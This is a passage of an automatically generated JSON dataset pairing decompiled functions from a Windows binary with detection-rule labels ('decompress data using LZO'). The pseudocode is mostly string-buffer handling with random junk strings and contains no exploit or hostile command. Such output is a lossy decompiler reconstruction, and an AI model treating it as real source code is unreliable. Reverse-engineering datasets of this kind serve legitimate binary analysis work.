*in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack112;\n    if ((uStack92 + 1 < 0x1000) || (iVar2 = *(iStack112 + -4),  (iStack112 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004283dd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004285b2:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004285be:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004285ca:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004285d6:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004285e2:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x004285ee:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1681
    },
    "00403391": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00403391(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack84 [4];\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack84;\n    uStack24 = 0x44c1e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    aiStack84[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x29);\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x33, uStack36, \"jbpgpjfbbhgxcmgnpktbrklpcqzxqlapqxcxfrprtuvnpstheoy\");\n    if (uStack40 < 0x10) {\ncode_r0x00424b9a:\n        if (0xf < uStack64) {\n            iVar2 = aiStack84[0];\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(aiStack84[0] + -4),  0x1f < (aiStack84[0] + -4) - iVar2))\n            goto code_r0x00424c71;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x00424c7d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x00424c89;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00424b9a;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00424c71:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00424c7d:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00424c89:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 901
    },
    "004040e8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004040e8(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uint32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint32_t in_stack_00000020;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uchar *in_stack_00000050;\n    uint32_t in_stack_00000064;\n    int32_t iStack308;\n    uint uStack292;\n    uint32_t uStack288;\n    int32_t iStack284;\n    uint uStack268;\n    uint32_t uStack264;\n    uchar uStack260;\n    uchar *puStack256;\n    int32_t iStack252;\n    uint uStack248;\n    uint uStack244;\n    uchar *puStack240;\n    uint32_t uStack236;\n    int32_t iStack220;\n    uchar *puStack200;\n    int32_t iStack196;\n    uint32_t uStack192;\n    uint uStack188;\n    int32_t iStack184;\n    uint32_t uStack180;\n    uchar auStack164 [8];\n    uchar *puStack156;\n    uint32_t in_stack_ffffff68;\n    uint uStack140;\n    uint32_t uStack136;\n    char *pcStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    uint8_t uStack104;\n    uchar *puStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uchar *puStack72;\n    uint uStack60;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    puStack84 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c640;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar3 = &stack0xffffffe0;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x00432957:\n        puStack32 = puVar3;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000034) {\n            uStack180 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (uStack180 = *(in_stack_00000020 - 4),  unaff_EDI = uStack180, \n               0x1f < (in_stack_00000020 - 4) - uStack180)) goto code_r0x00432a01;\n            uStack44 = 0x432999;\n            fcn.00401a32(uStack180);\n        }\n        in_stack_00000030 = 0;\n        in_stack_00000034 = 0xf;\n        in_stack_00000020 = in_stack_00000020 & 0xffffff00;\n        if (in_stack_00000064 < 0x10) {\ncode_r0x004329e2:\n            *in_FS_OFFSET = iStack28;\n            return iStack28;\n        }\n        puStack84 = in_stack_00000050;\n        if ((in_stack_00000064 + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000050 + -4),  uStack180 = unaff_EDI,  in_stack_00000050 + (-4 - puStack84) < 0x20)\n           ) {\n            uStack44 = 0x4329df;\n            fcn.00401a32(puStack84);\n            goto code_r0x004329e2;\n        }\n    }\n    else {\n        uStack180 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (uStack180 = *(param_1 - 4),  unaff_EDI = uStack180,  (param_1 - 4) - uStack180 < 0x20)) {\n            uStack44 = 0x432954;\n            puStack32 = &stack0xffffffe0;\n            fcn.00401a32(uStack180);\n            puVar3 = puStack32;\n            goto code_r0x00432957;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00432a01:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    puStack48 = 0x432a2c;\n    fcn.004052d1();\n    uStack60 = 0x432a3c;\n    puStack48 = &stack0x00000008;\n    fcn.004052d1();\n    puStack72 = 0x432a4c;\n    uStack60 = &stack0x00000014;\n    fcn.004052d1();\n    puStack100 = &stack0xffffff74;\n    uStack88 = 0xffffffff;\n    uStack92 = 0x44c650;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack136 = uStack136 & 0xffffff00 | uStack104;\n    pcStack132 = \"ontxnaoopgodvwccyqgzwmvlvsqwerjpqvlgvaamacwkywxpn\";\n    uStack140 = 0x31;\n    uStack80 = uStack180;\n    puStack72 = &stack0x00000020;\n    fcn.00402f72();\n    if (uStack108 < 0x10) {\ncode_r0x00432aed:\n        *in_FS_OFFSET = iStack96;\n        return iStack96;\n    }\n    iStack184 = iStack128;\n    if ((uStack108 + 1 < 0x1000) || (iStack184 = *(iStack128 + -4),  (iStack128 + -4) - iStack184 < 0x20)) {\n        puStack156 = 0x432aed;\n        fcn.00401a32(iStack184);\n        goto code_r0x00432aed;\n    }\n    uStack88 = 0;\n    puStack156 = 0x432b12;\n    fcn.004047f5();\n    puStack156 = &stack0xffffffb8;\n    fcn.004052d1();\n    puStack200 = &stack0xffffff38;\n    puStack240 = &stack0xffffff5c;\n    uStack188 = 0xffffffff;\n    uStack192 = 0x44c660;\n    iStack196 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff3c;\n    uStack236 = uStack180;\n    puVar3 = &stack0xffffff38;\n    if (pcStack132 < 0x10) {\ncode_r0x00432b94:\n        puStack200 = puVar3;\n        uStack136 = 0;\n        pcStack132 = 0xf;\n        if (uStack80 < 0x10) {\ncode_r0x00432bda:\n            *in_FS_OFFSET = iStack196;\n            return iStack196;\n        }\n        puStack240 = puStack100;\n        if ((uStack80 + 1 < 0x1000) || (puStack240 = *(puStack100 + -4),  puStack100 + (-4 - puStack240) < 0x20)) {\n            fcn.00401a32(puStack240);\n            goto code_r0x00432bda;\n        }\n    }\n    else {\n        uStack236 = in_stack_ffffff68;\n        uVar2 = uStack180;\n        if ((pcStack132 + 1 < 0x1000) ||\n           (uStack236 = *(in_stack_ffffff68 - 4),  uVar2 = uStack236,  (in_stack_ffffff68 - 4) - uStack236 < 0x20)) {\n            puStack200 = &stack0xffffff38;\n            fcn.00401a32(uStack236);\n            uStack236 = uVar2;\n            puVar3 = puStack200;\n            goto code_r0x00432b94;\n        }\n        uStack188 = 0;\n        fcn.004047f5();\n    }\n    uStack188 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack256 = &stack0xfffffecc;\n    uStack248 = 0x44c670;\n    iStack252 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff04;\n    uStack292 = 0;\n    uStack288 = 0xf;\n    iStack308 = 0;\n    uStack244 = 5;\n    fcn.00402f72(0x15, iStack284, \"ageoxnpoeeqavfdjnmsrg\");\n    uStack268 = 0;\n    uStack264 = 0xf;\n    iStack284 = 0;\n    uStack244 = 6;\n    fcn.00402f72(0x14, uStack260, \"oussjugllboljuhntskm\");\n    if (uStack264 < 0x10) {\ncode_r0x00432d1a:\n        if (0xf < uStack288) {\n            iVar1 = iStack308;\n            if ((0xfff < uStack288 + 1) && (iVar1 = *(iStack308 + -4),  0x1f < (iStack308 + -4) - iVar1))\n            goto code_r0x00432e40;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < puStack200) {\n            iVar1 = iStack220;\n            if ((0xfff < puStack200 + 1) && (iVar1 = *(iStack220 + -4),  0x1f < (iStack220 + -4) - iVar1))\n            goto code_r0x00432e4c;\n            fcn.00401a32(iVar1);\n        }\n        puStack200 = 0xf;\n        if (0xf < &stack0xffffffc4) {\n            uVar2 = uStack192;\n            if ((0xfff < &stack0xffffffc5) && (uVar2 = *(uStack192 - 4),  0x1f < (uStack192 - 4) - uVar2))\n            goto code_r0x00432e58;\n            fcn.00401a32(uVar2);\n        }\n        uStack192 = uStack192 & 0xffffff00;\n        if (0xf < uStack136) {\n            puVar3 = puStack156;\n            if ((0xfff < uStack136 + 1) && (puVar3 = *(puStack156 + -4),  0x1f < puStack156 + (-4 - puVar3)))\n            goto code_r0x00432e64;\n            fcn.00401a32(puVar3);\n        }\n        *in_FS_OFFSET = iStack252;\n        return 0x1590f;\n    }\n    iVar1 = iStack284;\n    if ((uStack264 + 1 < 0x1000) || (iVar1 = *(iStack284 + -4),  (iStack284 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00432d1a;\n    }\n    uStack244 = 0;\n    fcn.004047f5();\ncode_r0x00432e40:\n    uStack244 = 1;\n    fcn.004047f5();\ncode_r0x00432e4c:\n    uStack244 = 2;\n    fcn.004047f5();\ncode_r0x00432e58:\n    uStack244 = 3;\n    fcn.004047f5();\ncode_r0x00432e64:\n    uStack244 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 2912
    },
    "004033fa": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004033fa(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c2d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    pcStack112 = \"najolwekiexteljjdcvwqdutmypdgcylqmnuxxiipbv\";\n    auStack120[0] = 0x2b;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x2b, uStack84, \"najolwekiexteljjdcvwqdutmypdgcylqmnuxxiipbv\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x2b, uStack36, \"najolwekiexteljjdcvwqdutmypdgcylqmnuxxiipbv\");\n    if (uStack64 < 0x10) {\ncode_r0x004278da:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00427aee;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x2b, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"najolwekiexteljjdcvwqdutmypdgcylqmnuxxiipbv\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x2b, uStack36, \"najolwekiexteljjdcvwqdutmypdgcylqmnuxxiipbv\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00427afa;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00427b06;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00427b12;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar3 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar3 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar3)) goto code_r0x00427b1e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar3 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar3 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar3)) goto code_r0x00427b2a;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x004278ce:\n        fcn.00401a32(uVar2);\n        goto code_r0x004278da;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x004278ce;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00427aee:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00427afa:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00427b06:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00427b12:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00427b1e:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00427b2a:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1701
    },
    "00403512": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00403512(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_0000004c;\n    uint32_t in_stack_00000060;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x414860;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x4e);\n    if (uStack40 < 0x10) {\ncode_r0x0040d696:\n        if (0xf < in_stack_00000028) {\n            iVar1 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar1 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar1)) goto code_r0x0040d786;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar1 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar1 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar1)) goto code_r0x0040d792;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000060) {\n            iVar1 = in_stack_0000004c;\n            if ((0xfff < in_stack_00000060 + 1) &&\n               (iVar1 = *(in_stack_0000004c + -4),  0x1f < (in_stack_0000004c + -4) - iVar1)) goto code_r0x0040d79e;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040d696;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040d786:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040d792:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040d79e:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 849
    },
    "00403517": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00403517(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44c7a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"cgdjexrbmxmjqdzslwidmfvltzfmhhwutramemasiyryihtfcmspujuwriyhswgskqlqshgpsbncerzoxxoeuzuinr\";\n    auStack96[0] = 0x5a;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x22, uStack36, \"rxacjseegwgavxqmbsqihascrqaqwltpvg\");\n    if (uStack40 < 0x10) {\ncode_r0x00436d69:\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x00436dff;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar1 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) goto code_r0x00436e0b;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542574;\n    }\n    iVar1 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(iStack60 + -4),  (iStack60 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00436d69;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00436dff:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00436e0b:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 808
    },
    "0040359e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t * __thiscall fcn.0040359e(uint32_t *param_1, uint32_t param_2, uint param_3, uchar param_4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    int32_t **in_FS_OFFSET;\n    uint32_t arg_8h_00;\n    uint32_t uStack36;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e490;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (param_2 < 0) {\n        fcn.004038aa();\n    }\n    else {\n        arg_8h_00 = param_1[5];\n        uVar5 = param_2 | 0xf;\n        uVar2 = 0x80000000;\n        uStack36 = 0x7fffffff;\n        if ((uVar5 < 0) || ((arg_8h_00 >> 1 ^ 0x7fffffff) < arg_8h_00)) {\ncode_r0x0041c494:\n            iVar3 = fcn.004024b9(uVar2 + 0x23, arg_8h_00);\n            uVar2 = iVar3 + 0x23U & 0xffffffe0;\n            *(uVar2 - 4) = iVar3;\n        }\n        else {\n            uStack36 = (arg_8h_00 >> 1) + arg_8h_00;\n            if (uStack36 <= uVar5) {\n                uStack36 = uVar5;\n            }\n            uVar2 = uStack36 + 1;\n            if (0xfff < uVar2) {\n                if (0xffffffdc < uVar2) goto code_r0x0041c532;\n                goto code_r0x0041c494;\n            }\n            uVar2 = fcn.004024b9(uVar2, arg_8h_00);\n        }\n        param_1[4] = param_2;\n        param_1[5] = uStack36;\n        fcn.0040314d(uVar2, param_4, param_2);\n        *(uVar2 + param_2) = 0;\n        if (arg_8h_00 < 0x10) {\ncode_r0x0041c4fd:\n            *param_1 = uVar2;\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uVar5 = *param_1;\n        arg_8h = uVar5;\n        if ((arg_8h_00 + 1 < 0x1000) || (arg_8h = *(uVar5 - 4),  (uVar5 - 4) - arg_8h < 0x20)) {\n            fcn.00401a32(arg_8h);\n            goto code_r0x0041c4fd;\n        }\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041c532:\n    fcn.004050bf();\n    fcn.004052d1();\n    pcVar1 = swi(3);\n    puVar4 = (*pcVar1)();\n    return puVar4;\n}\n",
        "token_count": 781
    },
    "004035da": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.004035da(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c690;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x18);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x00433d80;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_00000040) {\n        iVar1 = in_stack_0000002c;\n        if ((0xfff < in_stack_00000040 + 1) &&\n           (iVar1 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar1)) {\ncode_r0x00433d80:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x542424;\n}\n",
        "token_count": 503
    },
    "004035fd": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.004035fd(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    uint auStack76 [2];\n    char *pcStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack76;\n    uStack24 = 0x44c610;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 3;\n    pcStack68 = \"esypokremezetoutcaiapmhbuwnkaorfczgdcuheap\";\n    auStack76[0] = 0x2a;\n    fcn.00402f72();\n    *puStack40 = 0;\n    puStack40[4] = 0;\n    puStack40[5] = 0xf;\n    *puStack40 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x11, uStack36, \"ciqzzgcumtjxovdhl\");\n    if (uStack44 < 0x10) {\ncode_r0x0043205d:\n        if (0xf < in_stack_0000002c) {\n            iVar2 = in_stack_00000018;\n            if ((0xfff < in_stack_0000002c + 1) &&\n               (iVar2 = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - iVar2)) goto code_r0x00432104;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar2 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar2 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar2)) goto code_r0x00432110;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack64;\n    if ((uStack44 + 